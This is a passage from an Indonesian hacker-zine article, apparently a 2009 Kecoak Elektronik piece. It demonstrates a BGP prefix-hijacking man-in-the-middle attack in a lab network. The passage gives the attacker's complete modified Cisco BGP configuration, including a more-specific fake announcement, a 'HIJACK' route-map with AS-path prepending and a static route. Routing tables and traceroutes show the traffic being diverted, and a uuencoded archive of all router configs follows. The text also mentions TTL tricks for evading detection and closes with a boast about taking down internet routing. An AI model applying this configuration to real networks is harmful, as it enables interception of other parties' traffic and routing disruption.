+Tracing the route to 10.10.220.2
+
+  1 3.3.3.2 0 msec 8 msec 0 msec
+  2 10.10.220.2 [AS 200] 0 msec 8 msec * 
+AS30#
+
+
+--[ii]-- Router AS 60
+
+AS60#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     1.0.0.0/24 is subnetted, 2 subnets
+B       1.2.3.0 [20/0] via 4.4.4.2, 05:09:46
+B       1.2.4.0 [20/0] via 4.4.4.2, 05:09:46
+     2.0.0.0/24 is subnetted, 3 subnets
+B       2.2.2.0 [20/0] via 4.4.4.2, 03:02:25
+C       2.2.3.0 is directly connected, Ethernet0/0
+B       2.2.4.0 [20/0] via 2.2.3.2, 03:02:25
+     3.0.0.0/24 is subnetted, 1 subnets
+B       3.3.3.0 [20/0] via 4.4.4.2, 05:09:46
+     4.0.0.0/24 is subnetted, 2 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+B       4.3.2.0 [20/0] via 5.4.3.2, 00:04:08
+     5.0.0.0/24 is subnetted, 2 subnets
+C       5.4.3.0 is directly connected, Ethernet1/1
+B       5.5.5.0 [20/0] via 5.4.3.2, 00:04:09
+     6.0.0.0/24 is subnetted, 1 subnets
+B       6.6.6.0 [20/0] via 2.2.3.2, 05:09:17
+     10.0.0.0/22 is subnetted, 1 subnets
+B       10.10.220.0 [20/0] via 4.4.4.2, 02:41:11
+AS60#traceroute 10.10.220.2
+
+Type escape sequence to abort.
+Tracing the route to 10.10.220.2
+
+  1 4.4.4.2 16 msec 12 msec 16 msec
+  2 1.2.4.1 [AS 50] 120 msec 108 msec 20 msec
+  3 3.3.3.2 [AS 30] 32 msec 72 msec 48 msec
+  4 10.10.220.2 [AS 200] 64 msec 12 msec * 
+AS60#
+
+-----------------------------------------------------------------------
+
+Pada kondisi ini traffic data berjalan dengan routing normal. Proses
+routing normal ini juga berlaku untuk router yang lain.
+
+--[5.2.2]-- Kondisi Man In the Middle
+
+Ketika attacker menginginkan Man In the Middle antar router tesebut,
+maka attacker membuat announcement palsu jaringan 10.10.220.0/22 dengan
+prefix lebih spesifik. Prefix yang dipilih tentunya sesuai dengan
+keinginan attacker, misalnya attacker membuat announcement palsu pada
+router dengan nomor AS 100 untuk jaringan 10.10.220.0/24. Attacker
+selanjutnya membuat routing untuk menuju jaringan 10.10.220.0/24 secara 
+statik melalui router dengan nomor AS 10 (Alamat IP 4.3.2.1). Terakhir
+attacker mengatur AS-PATH menuju 10.10.220.0/24 melalui nomor AS 10 20
+100.
+
+Konfigurasi pada router dengan nomor AS 100 setelah dimodifikasi oleh
+attacker dalam proses Man In the Middle sebagai berikut:
+
+-----------------------------------------------------------------------
+
+router bgp 100
+ network 2.2.4.0 mask 255.255.255.0
+ network 4.3.2.0 mask 255.255.255.0
+ network 5.4.3.0 mask 255.255.255.0
+ network 10.10.220.0 mask 255.255.255.0
+ neighbor 2.2.4.2 remote-as 40
+ neighbor 2.2.4.2 prefix-list JACKED out
+ neighbor 2.2.4.2 route-map HIJACK out
+ neighbor 4.3.2.1 remote-as 10
+ neighbor 4.3.2.1 prefix-list ANN out
+ neighbor 5.4.3.1 remote-as 60
+ neighbor 5.4.3.1 prefix-list JACKED out
+ neighbor 5.4.3.1 route-map HIJACK out
+!
+ip classless
+ip route 10.10.220.0 255.255.255.0 4.3.2.1
+no ip http server
+!
+!
+ip prefix-list ANN seq 10 permit 2.2.4.0/24
+ip prefix-list ANN seq 15 permit 4.3.2.0/24
+ip prefix-list ANN seq 20 permit 5.4.3.0/24
+!
+ip prefix-list JACKED seq 10 permit 2.2.4.0/24
+ip prefix-list JACKED seq 15 permit 4.3.2.0/24
+ip prefix-list JACKED seq 20 permit 5.4.3.0/24
+ip prefix-list JACKED seq 25 permit 10.10.220.0/24
+route-map HIJACK permit 10
+ set as-path prepend 10 20 200
+!
+
+-----------------------------------------------------------------------
+
+Dengan konfigurasi ini attacker berhasil membuat traffic data dari
+router AS 30, AS 40, AS 50, dan AS 60 menuju 10.10.220.0/24 pada router
+AS 200 melalui router dengan AS 100. Berikut tabel routing pada router
+AS 30 dan AS 60 beserta hasil traceroute menuju 10.10.220.2.
+
+-----------------------------------------------------------------------
+
+--[i]-- Router AS 30
+
+AS30#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     1.0.0.0/24 is subnetted, 2 subnets
+C       1.2.3.0 is directly connected, Ethernet1/0
+C       1.2.4.0 is directly connected, Ethernet1/1
+     2.0.0.0/24 is subnetted, 3 subnets
+B       2.2.2.0 [20/0] via 1.2.3.2, 01:30:20
+B       2.2.3.0 [20/0] via 6.6.6.1, 03:51:51
+B       2.2.4.0 [20/0] via 6.6.6.1, 03:51:51
+     3.0.0.0/24 is subnetted, 1 subnets
+C       3.3.3.0 is directly connected, Ethernet0/0
+     4.0.0.0/24 is subnetted, 2 subnets
+B       4.4.4.0 [20/0] via 1.2.4.2, 03:51:51
+B       4.3.2.0 [20/0] via 1.2.3.2, 03:51:47
+     5.0.0.0/24 is subnetted, 2 subnets
+B       5.4.3.0 [20/0] via 6.6.6.1, 03:51:28
+B       5.5.5.0 [20/0] via 1.2.3.2, 03:51:51
+     6.0.0.0/24 is subnetted, 1 subnets
+C       6.6.6.0 is directly connected, Ethernet1/2
+     10.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
+B       10.10.220.0/24 [20/0] via 6.6.6.1, 01:16:09
+B       10.10.220.0/22 [20/0] via 3.3.3.2, 01:23:34
+AS30#traceroute 10.10.220.2
+
+Type escape sequence to abort.
+Tracing the route to 10.10.220.2
+
+  1 6.6.6.1 8 msec 8 msec 4 msec
+  2 2.2.4.1 [AS 40] 12 msec 16 msec 12 msec
+  3 4.3.2.1 [AS 10] 32 msec 16 msec 20 msec
+  4 5.5.5.2 [AS 20] 36 msec 24 msec 28 msec
+  5 2.2.2.2 [AS 20] 16 msec 28 msec 40 msec
+  6 10.10.220.2 [AS 200] 60 msec 40 msec * 
+AS30# 
+
+
+--[ii]-- Router AS 60
+
+AS60#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     1.0.0.0/24 is subnetted, 2 subnets
+B       1.2.3.0 [20/0] via 4.4.4.2, 03:55:33
+B       1.2.4.0 [20/0] via 4.4.4.2, 03:55:33
+     2.0.0.0/24 is subnetted, 3 subnets
+B       2.2.2.0 [20/0] via 4.4.4.2, 01:48:13
+C       2.2.3.0 is directly connected, Ethernet0/0
+B       2.2.4.0 [20/0] via 2.2.3.2, 01:48:13
+     3.0.0.0/24 is subnetted, 1 subnets
+B       3.3.3.0 [20/0] via 4.4.4.2, 03:55:33
+     4.0.0.0/24 is subnetted, 2 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+B       4.3.2.0 [20/0] via 2.2.3.2, 01:20:03
+     5.0.0.0/24 is subnetted, 2 subnets
+C       5.4.3.0 is directly connected, Ethernet1/1
+B       5.5.5.0 [20/0] via 4.4.4.2, 01:20:31
+     6.0.0.0/24 is subnetted, 1 subnets
+B       6.6.6.0 [20/0] via 2.2.3.2, 03:55:05
+     10.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
+B       10.10.220.0/24 [20/0] via 5.4.3.2, 01:19:37
+B       10.10.220.0/22 [20/0] via 4.4.4.2, 01:26:59
+AS60#traceroute 10.10.220.2
+
+Type escape sequence to abort.
+Tracing the route to 10.10.220.2
+
+  1 5.4.3.2 4 msec 0 msec 12 msec
+  2 4.3.2.1 [AS 10] 28 msec 8 msec 16 msec
+  3 5.5.5.2 [AS 20] 28 msec 12 msec 36 msec
+  4 2.2.2.2 [AS 20] 68 msec 36 msec 24 msec
+  5 10.10.220.2 [AS 200] 56 msec 44 msec * 
+AS60#
+
+
+Pada router dengan nomor AS 30, traffic data menuju 10.10.220.2/24
+melalui router dengan AS 100 (Alamat IP 2.2.4.1). Pada router AS 60,
+traffic data menuju 10.10.220.2/24 melalui router dengan AS 100 (Alamat
+IP 5.4.3.2). Hal ini juga terjadi pada router dengan nomor AS 40 dan AS
+50.
+
+-----------------------------------------------------------------------
+
+Pada presentasi Alex Pilosov dan Tony Kapela dibahas juga bagaimana
+menyembunyikan router attacker dan router koneksi outbound attacker 
+dengan TTL adjusment. Hal ini sangat berguna agar exploitasi Man In the 
+Middle ini semakin sulit dideteksi. Hanya saja saat Adzan Subuh 
+berkumandang saya belum menemukan ide bagaimana cara memanfaatkan TTL 
+adjusment tersebut. Silakan dijadikan bahan untuk ngoprek bagi 
+teman-teman yang tertarik dengan artikel ini.
+
+
+--[6]-- Close Words
+
+We're ready to take down the whole internet routing. We're ready 
+to bring down internet to the end of its era (Anonymous).
+
+
+--[7]-- Referensi
+
+[i]. 	RFC 1930  http://www.ietf.org/rfc/rfc1930.txt
+[ii].	RFC 1771  http://www.ietf.org/rfc/rfc1771.txt
+[iii].	Boney, James, 2005, "Cisco IOS in a Nutshell", O Reilly Media, Inc, 
+	Sebastopol
+[iv].	RFC 4272  http://www.ietf.org/rfc/rfc4272.txt
+[v].	http://blog.wired.com/27bstroke6/files/edited-iphd-2.ppt
+
+
+--[8]-- Complete Router Configuration
+
+begin 644 conf.tgz
+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
+=+"PL+"PL+"PL+"PL+"PL+"PL]L'_Y1*#;0!X````
+`
+end
+
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2009 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net
